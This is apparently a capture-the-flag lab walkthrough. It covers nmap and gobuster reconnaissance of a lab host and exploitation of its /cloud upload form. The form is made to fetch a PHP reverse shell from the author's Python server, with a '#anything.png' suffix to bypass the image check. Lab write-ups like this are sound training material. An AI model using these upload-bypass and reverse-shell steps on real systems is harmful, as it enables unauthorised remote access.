</br> nmap -p- -T5 10.10.238.206 -v
</br> 
</br> PORT    STATE SERVICE
</br> 22/tcp  open  ssh
</br> 80/tcp  open  http
</br> 139/tcp open  netbios-ssn
</br> 445/tcp open  microsoft-ds
</br> MAC Address: 02:F3:A8:36:7C:35 (Unknown)
</br> 
</br> nmap 22,80,139,445 -A -T3 10.10.238.206  -v
</br> 
</br> PORT    STATE SERVICE     VERSION
</br> 22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</br> 80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
</br> | http-cookie-flags: 
</br> |   /: 
</br> |     PHPSESSID: 
</br> |_      httponly flag not set
</br> | http-methods: 
</br> |_  Supported Methods: GET HEAD POST OPTIONS
</br> |_http-server-header: Apache/2.4.41 (Ubuntu)
</br> | http-title: Login
</br> |_Requested resource was login.php
</br> 139/tcp open  netbios-ssn Samba smbd 4.6.2
</br> 445/tcp open  netbios-ssn Samba smbd 4.6.2
</br> MAC Address: 02:F3:A8:36:7C:35 (Unknown)
</br> 

</br>  gobuster dir -u http://10.10.238.206 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

</br> ...
</br> /css                  (Status: 301) [Size: 312] [--> http://10.10.238.206/css/]
</br> /cloud                (Status: 301) [Size: 314] [--> http://10.10.238.206/cloud/]
</br> /server-status        (Status: 403) [Size: 278]


</br> login form found over port 80
![loginPageFound](https://github.com/user-attachments/assets/ba43c977-ef5b-4049-8881-07f84cd5f15e)

</br> there are no quick wins for the version of samba 4.6 detected
![noQuickWinsFromVersionOfSamba46](https://github.com/user-attachments/assets/373e0f5c-73b0-46c0-91e0-a1bd1588394b)

</br> /cloud looks like a vector for file upload...

![arbFileUploadMaybe](https://github.com/user-attachments/assets/6d795b46-5271-40b4-bcc2-a1520777829c)

![testIntercept2](https://github.com/user-attachments/assets/189768a9-4128-4aff-9089-a56e046a253b)
just a test with putting in potato.txt
![proxyIntercept](https://github.com/user-attachments/assets/15f16207-4cfb-4ac3-8ccf-8bdf3535fb76)
</br>  huh, seems to be looking for an image in particular. Is it doing some kinda check for that?

![selectAnImage](https://github.com/user-attachments/assets/23a4dbc9-adc4-434d-9f3c-534d578f4f6c)


</br> from burpsuite, we see it uploads as a url, so the upload file should be displayed in the url bar at the top
</br> ...
</br> make nano shell1.php, change listening port and listening address with the basic pentestmonkey rev-shell for php
</br> below, I'm finding my local copy of the rev-shell template

![phpREvShell1](https://github.com/user-attachments/assets/9cb80a67-c471-41e3-9afd-43f1ecaf0ea1)
</br>  mod the port to 1984 because, haha, funny.
![shellMod1](https://github.com/user-attachments/assets/89e66405-e2f1-4925-abcb-5edb00a7793f)

spin up the python server so we can give the shell to the uploader
python -m SimpleHTTPServer 7737

(weird port number because others were in use)
put into upload bar -->
`http://10.10.228.228:7737/shell1.jpg`
![tryWithPython3AndShell1](https://github.com/user-attachments/assets/b5f78b20-c36a-4645-ad6c-d2e9f2253971)

To fool the check for an image, we can bypass with #anything.png
but we need to delete the hashtag and trailing junk when executing the file via URL.
![wrongNameShouldBeShell1](https://github.com/user-attachments/assets/8e53fa79-8134-45c1-a2f3-791f753cb765)



